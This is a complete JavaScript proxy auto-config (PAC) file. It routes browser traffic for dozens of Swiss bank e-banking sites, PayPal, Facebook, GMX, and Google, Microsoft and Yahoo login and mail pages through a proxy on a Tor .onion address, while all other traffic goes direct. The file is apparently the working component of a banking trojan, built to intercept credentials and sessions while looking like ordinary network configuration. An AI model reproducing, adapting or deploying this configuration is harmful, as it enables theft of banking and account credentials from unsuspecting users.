function FindProxyForURL(url, host) {
    var proxy = "PROXY r7t6zvhfwph5f6d5.onion:88;";
    var hosts = new Array(
        '*.facebook.com', '*.gmx.at', '*.gmx.ch', '*.gmx.com', '*.gmx.de', '*.gmx.net',
        'accounts.google.com', 'mail.google.com', 'login.live.com', 'login.yahoo.com', '*.paypal.com',
        '*.postfinance.ch', 'cs.directnet.com', 'eb.akb.ch', '*.ubs.com', 'tb.raiffeisendirect.ch',
        '*.bkb.ch', '*.lukb.ch', '*.zkb.ch', '*.onba.ch', 'e-banking.gkb.ch', '*.bekb.ch',
        'wwwsec.ebanking.zugerkb.ch', 'netbanking.bcge.ch', '*.raiffeisen.ch', '*.credit-suisse.com',
        '*.static-ubs.com', '*.clientis.ch', 'clientis.ch', '*bcvs.ch', '*.cic.ch', 'cic.ch',
        '*baloise.ch', 'ukb.ch', '*.ukb.ch', 'urkb.ch', '*.urkb.ch', '*.eek.ch', '*szkb.ch', '*shkb.ch',
        '*glkb.ch', '*nkb.ch', '*owkb.ch', '*cash.ch', '*bcf.ch', 'ebanking.raiffeisen.ch', '*bcv.ch',
        '*juliusbaer.com', '*abs.ch', '*bcn.ch', '*blkb.ch', '*bcj.ch', '*zuercherlandbank.ch',
        '*valiant.ch', '*wir.ch', '*bankthalwil.ch', '*piguetgalland.ch', '*triba.ch', '*inlinea.ch',
        '*bernerlandbank.ch', '*bancasempione.ch', '*bsibank.com', '*corneronline.ch',
        '*vermoegenszentrum.ch', '*gobanking.ch');
    for (var i = 0; i < hosts.length; i++) {
        if (shExpMatch(
                host, hosts[i])) { return proxy }
    }
    return "DIRECT"
}
